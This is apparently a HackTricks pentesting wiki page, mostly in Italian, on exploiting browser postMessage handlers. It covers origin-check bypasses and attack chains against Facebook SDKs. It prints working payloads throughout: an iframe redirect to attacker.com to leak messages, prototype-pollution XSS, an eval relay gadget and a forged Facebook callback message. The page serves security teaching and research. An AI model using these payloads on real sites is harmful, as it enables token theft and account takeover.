# PostMessage Vulnerabilità

{{#include ../../banners/hacktricks-training.md}}

## Invia **PostMessage**

**PostMessage** usa la seguente funzione per inviare un messaggio:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Nota che **targetOrigin** può essere '\*' o un URL come _https://company.com._\
Nel **secondo scenario**, il **messaggio può essere inviato solo a quel dominio** (anche se l'origin dell'oggetto Window è diverso).\
Se viene usato il **wildcard**, **i messaggi potrebbero essere inviati a qualsiasi dominio**, e saranno inviati all'origin dell'oggetto Window.

### Attacco a iframe & wildcard in **targetOrigin**

Come spiegato in [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), se trovi una pagina che può essere **iframed** (no `X-Frame-Header` protection) e che sta **inviando messaggi sensibili** via **postMessage** usando un **wildcard** (\*), puoi **modificare** l'**origin** dell'**iframe** e **leak** il **messaggio sensibile** a un dominio controllato da te.\
Nota che se la pagina può essere iframed ma il **targetOrigin** è **impostato su un URL e non su un wildcard**, questo **trucco non funzionerà**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** è la funzione usata da JS per dichiarare la funzione che si aspetta `postMessages`.\
Verrà usato un codice simile al seguente:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in questo caso come la **prima cosa** che il codice fa sia **controllare l'origin**. Questo è estremamente **importante**, soprattutto se la pagina deve fare **qualcosa di sensibile** con le informazioni ricevute (per esempio cambiare una password). **Se non controlla l'origin, gli attacker possono far inviare ai victim dati arbitrari a questi endpoints** e cambiare le password delle vittime (in questo esempio).

### Enumerazione

Per **trovare event listeners** nella pagina corrente puoi:

- **Cercare** nel codice JS `window.addEventListener` e `$(window).on` (_JQuery version_)
- **Eseguire** nella console degli strumenti per sviluppatori: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Andare in** _Elements --> Event Listeners_ negli strumenti per sviluppatori del browser

![](<../../images/image (396).png>)

- Usare un **browser extension** come [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) o [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Queste estensioni intercetteranno **tutti i messaggi** e te li mostreranno.

### Origin check bypasses

- L'attributo **`event.isTrusted`** è considerato sicuro poiché ritorna `True` solo per eventi generati da azioni utente genuine. Anche se è difficile da bypassare se implementato correttamente, il suo ruolo nei controlli di sicurezza è significativo.
- L'uso di **`indexOf()`** per la validazione dell'origin in eventi PostMessage può essere suscettibile di bypass. Un esempio che illustra questa vulnerabilità è:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- Il metodo **`search()`** di `String.prototype.search()` è pensato per le regular expressions, non per le stringhe. Passare qualcosa che non sia una regexp porta a una conversione implicita in regex, rendendo il metodo potenzialmente insicuro. Questo perché nella regex un punto (.) agisce come wildcard, permettendo di bypassare la validazione con domini appositamente creati. Per esempio:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- La funzione **`match()`**, similmente a `search()`, lavora con regex. Se la regex è strutturata in modo errato, potrebbe essere soggetta a bypass.
- La funzione **`escapeHtml`** è pensata per sanitizzare gli input escandendo caratteri. Tuttavia, non crea un nuovo oggetto escaped ma sovrascrive le proprietà dell'oggetto esistente. Questo comportamento può essere sfruttato. In particolare, se un oggetto può essere manipolato in modo che la sua proprietà controllata non riconosca `hasOwnProperty`, `escapeHtml` non funzionerà come previsto. Questo è dimostrato negli esempi seguenti:

- Expected Failure:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypassing the escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

Nel contesto di questa vulnerabilità, l'oggetto `File` è particolarmente sfruttabile a causa della sua proprietà in sola lettura `name`. Questa proprietà, quando usata nelle template, non viene sanitizzata dalla funzione `escapeHtml`, portando a potenziali rischi di sicurezza.

- La proprietà `document.domain` in JavaScript può essere impostata da uno script per accorciare il dominio, permettendo una politica same-origin più rilassata all'interno dello stesso dominio padre.

### Origin-only trust + trusted relays

Se un receiver controlla solo **`event.origin`** (es. si fida di qualsiasi `*.trusted.com`) spesso puoi trovare una **pagina "relay" su quell'origin che riflette param controllati dall'attacker via `postMessage`** verso un `targetOrigin`/`targetWindow` fornito. Esempi includono gadget di marketing/analytics che prendono query params e inoltrano `{msg_type, access_token, ...}` a `opener`/`parent`. Puoi:

- **Aprire** la pagina vittima in un popup/iframe che ha un `opener` così i suoi handler si registrano (molti pixel/SDK si attaccano solo quando `window.opener` esiste).
- **Navigare** un'altra finestra attacker verso l'endpoint relay sull'origin trusted, popolando i campi del messaggio che vuoi iniettare (message type, tokens, nonces).
- Poiché il messaggio ora proviene **dall'origin trusted**, la validazione basata solo sull'origin passa e puoi innescare comportamenti privilegiati (cambi di stato, chiamate API, scritture nel DOM) nel listener della vittima.

Pattern di abuso osservati in the wild:

- Analytics SDKs (es. pixel/fbevents-style) consumano messaggi come `FACEBOOK_IWL_BOOTSTRAP`, poi **chiamano API backend usando un token fornito nel messaggio** e includono **`location.href` / `document.referrer`** nel body della richiesta. Se fornisci il tuo token, puoi **leggere queste richieste nella cronologia/log delle richieste del token** ed esfiltrare **OAuth codes/tokens** presenti nell'URL/referrer della pagina vittima.
- Qualsiasi relay che riflette campi arbitrari in `postMessage` ti permette di **spoofare message types** attesi da listener privilegiati. Combina con una validazione degli input debole per raggiungere chiamate Graph/REST, sblocco di funzionalità, o flussi equivalenti a CSRF.

Suggerimenti per la ricerca: enumera i listener `postMessage` che controllano solo `event.origin`, poi cerca **endpoint HTML/JS same-origin che inoltrano URL params via `postMessage`** (preview di marketing, login popups, pagine di errore OAuth). Combina entrambi con `window.open()` + `postMessage` per bypassare i controlli sull'origin.

### e.origin == window.origin bypass

When embedding a web page within a **sandboxed iframe** using %%%%%%, it's crucial to understand that the iframe's origin will be set to null. This is particularly important when dealing with **sandbox attributes** and their implications on security and functionality.

By specifying **`allow-popups`** in the sandbox attribute, any popup window opened from within the iframe inherits the sandbox restrictions of its parent. This means that unless the **`allow-popups-to-escape-sandbox`** attribute is also included, the popup window's origin is similarly set to `null`, aligning with the iframe's origin.

Consequently, when a popup is opened under these conditions and a message is sent from the iframe to the popup using **`postMessage`**, both the sending and receiving ends have their origins set to `null`. This situation leads to a scenario where **`e.origin == window.origin`** evaluates to true (`null == null`), because both the iframe and the popup share the same origin value of `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

It's possible to check if the message came from the same window the script is listening in (specially interesting for **Content Scripts from browser extensions** to check if the message was sent from the same page):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Puoi forzare **`e.source`** di un messaggio a essere null creando un **iframe** che **invia** il **postMessage** e viene **eliminato immediatamente**.

Per ulteriori informazioni **leggi:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### Bypass dell'X-Frame-Header

Per eseguire questi attacchi idealmente dovresti essere in grado di **inserire la pagina web vittima** dentro un `iframe`. Ma alcuni header come `X-Frame-Header` possono **impedire** quel **comportamento**.\
In questi scenari puoi comunque usare un attacco meno stealthy. Puoi aprire una nuova scheda verso l'applicazione web vulnerabile e comunicare con essa:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Rubare il messaggio inviato al child bloccando la pagina principale

Nella pagina seguente puoi vedere come potresti rubare dei **dati postmessage sensibili** inviati a un **child iframe** bloccando la **principale** pagina prima di inviare i dati e abusando di una **XSS in the child** per **leak the data** prima che vengano ricevuti:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Rubare il messaggio modificando la location dell'iframe

Se puoi inserire in iframe una pagina web senza X-Frame-Header che contiene un altro iframe, puoi **cambiare la location di quel child iframe**, quindi se sta ricevendo un **postmessage** inviato usando un **wildcard**, un attaccante potrebbe **cambiare** l'**origin** di quell'iframe verso una pagina **controllata** da lui e **rubare** il messaggio:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage per Prototype Pollution e/o XSS

In scenari in cui i dati inviati tramite `postMessage` vengono eseguiti da JS, puoi **iframe** la **pagina** e **sfruttare** la **prototype pollution/XSS** inviando l'exploit via `postMessage`.

A couple of **ottime spiegazioni di XSS tramite `postMessage`** possono essere trovate in [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Esempio di un exploit per abusare di **Prototype Pollution e poi XSS** tramite un `postMessage` a un `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Per **maggiori informazioni**:

- Collegamento alla pagina su [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Collegamento alla pagina su [**XSS**](../xss-cross-site-scripting/index.html)
- Collegamento alla pagina su [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Caricamento di script derivati dall'origine e pivot della supply-chain (studio del caso CAPIG)

`capig-events.js` ha registrato un handler `message` solo quando `window.opener` esisteva. Su `IWL_BOOTSTRAP` verificava `pixel_id` ma memorizzava `event.origin` e successivamente lo usava per costruire `${host}/sdk/${pixel_id}/iwl.js`.

<details>
<summary>Handler che scrive un'origine controllata dall'attaccante</summary>
```javascript
if (window.opener) {
window.addEventListener("message", (event) => {
if (
!localStorage.getItem("AHP_IWL_CONFIG_STORAGE_KEY") &&
!localStorage.getItem("FACEBOOK_IWL_CONFIG_STORAGE_KEY") &&
event.data.msg_type === "IWL_BOOTSTRAP" &&
checkInList(g.pixels, event.data.pixel_id) !== -1
) {
localStorage.setItem("AHP_IWL_CONFIG_STORAGE_KEY", {
pixelID: event.data.pixel_id,
host: event.origin,
sessionStartTime: event.data.session_start_time,
})
startIWL() // loads `${host}/sdk/${pixel_id}/iwl.js`
}
})
}
```
</details>

**Exploit (origin → script-src pivot):**
1. Ottenere un opener: ad esempio, in Facebook Android WebView riutilizzare `window.name` con `window.open(target, name)` in modo che la finestra diventi il suo stesso opener, quindi inviare un postMessage da un iframe malevolo.
2. Inviare `IWL_BOOTSTRAP` da qualsiasi origin per salvare `host = event.origin` in `localStorage`.
3. Ospitare `/sdk/<pixel_id>/iwl.js` su qualsiasi origin consentito dalla CSP (takeover/XSS/upload su un dominio analytics in whitelist). `startIWL()` poi carica JS dell'attaccante nel sito che incorpora (es., `www.meta.com`), abilitando chiamate cross-origin con credenziali e account takeover.

Se il controllo diretto dell'opener fosse stato impossibile, compromettere un iframe di terze parti sulla pagina permetteva comunque di inviare il `postMessage` appositamente creato al parent per avvelenare l'host memorizzato e forzare il caricamento dello script.

**Backend-generated shared script → stored XSS:** il plugin `AHPixelIWLParametersPlugin` concatenava i parametri delle regole utente nel JS aggiunto a `capig-events.js` (es., `cbq.config.set(...)`). L'iniezione di breakout come `"]}` permetteva di inserire JS arbitrario, creando uno stored XSS nello script condiviso servito a tutti i siti che lo caricavano.

### Trusted-origin allowlist isn't a boundary

Un controllo rigoroso di `event.origin` funziona solo se la **trusted origin non può eseguire attacker JS**. Quando pagine privilegiate incorporano iframe di terze parti e assumono che `event.origin === "https://partner.com"` sia sicuro, qualsiasi XSS in `partner.com` diventa un ponte verso il parent:
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
Schema di attacco osservato in natura:

1. **Sfrutta XSS nell'iframe del partner** e dropa un relay gadget così qualsiasi `postMessage` diventa code exec all'interno dell'origine attendibile:
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **Dalla pagina dell'attaccante**, invia JS all'iframe compromesso che inoltra un tipo di messaggio consentito al parent. Il messaggio origina da `partner.com`, supera l'allowlist e trasporta HTML che viene inserito in modo non sicuro:
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. The parent injects the attacker HTML, giving **JS execution in the parent origin** (e.g., `facebook.com`), which can then be used to steal OAuth codes or pivot to full account takeover flows.

Key takeaways:

- **Partner origin isn't a boundary**: qualsiasi XSS in un partner "trusted" permette agli attacker di inviare messaggi consentiti che bypassano i controlli su `event.origin`.
- Handlers che **render partner-controlled payloads** (ad es., `innerHTML` su specifici tipi di message) trasformano la compromissione del partner in una same-origin DOM XSS.
- Una ampia **message surface** (molti tipi, nessuna validazione della struttura) offre più gadget per pivotare una volta compromesso un iframe del partner.

### Predicting **`Math.random()`** callback tokens in postMessage bridges

Quando la validazione dei messaggi usa un “shared secret” generato con `Math.random()` (ad es., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) e lo stesso helper nomina anche gli iframe dei plugin, puoi recuperare gli output del PRNG e forgiare messaggi trusted:

- Leak PRNG outputs via `window.name`: lo SDK auto-nomina gli iframe dei plugin con `guid()`. Se controlli il top frame, iframe la pagina vittima, poi navighi l'iframe del plugin verso la tua origin (es., `window.frames[0].frames[0].location='https://attacker.com'`) e leggi `window.frames[0].frames[0].name` per ottenere un output raw di `Math.random()`.
- Forzare più output senza reload: alcuni SDK espongono un percorso di reinit; nello FB SDK, invocare `init:post` con `{xfbml:1}` forza `XFBML.parse()`, distrugge/ricrea l'iframe del plugin e genera nuovi nomi/ID di callback. Ripetere la reinit produce tanti output del PRNG quanti ne servono (nota chiamate interne extra a `Math.random()` per callback/iframe ID, quindi gli solver devono saltare valori intermedi).
- Trusted-origin delivery via parameter pollution: se un endpoint plugin first-party riflette un parametro non sanitizzato nel payload cross-window (es., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), puoi iniettare `&type=...&iconSVG=...` preservando l'origin trusted `facebook.com`.
- Predict the next callback: converti i nomi degli iframe leakati di nuovo in float in `[0,1)` e fornisci diversi valori (anche non consecutivi) a un predictor di `Math.random` di V8 (es., basato su Z3). Genera localmente il prossimo `guid()` per forgiare il token di callback atteso.
- Trigger the sink: costruisci i dati del postMessage in modo che il bridge dispatchi `xd.mpn.setupIconIframe` e inietti HTML in `iconSVG` (es., URL-encoded `<img src=x onerror=...>`), ottenendo una DOM XSS all'interno dell'origin host; da lì, si possono leggere iframe same-origin (OAuth dialogs, arbiters, ecc.).
- Framing quirks help: la catena richiede framing. In alcuni webview mobile, `X-Frame-Options` può degradare in `ALLOW-FROM` non supportato quando è presente `frame-ancestors`, e parametri di “compat” possono forzare `frame-ancestors` permissivi, abilitando il side channel `window.name`.

#### Esempio minimo di messaggio falsificato
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Riferimenti

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Per esercitarsi: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [CAPIG postMessage origin trust → script loading + stored JS injection](https://ysamm.com/uncategorized/2025/01/13/capig-xss.html)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
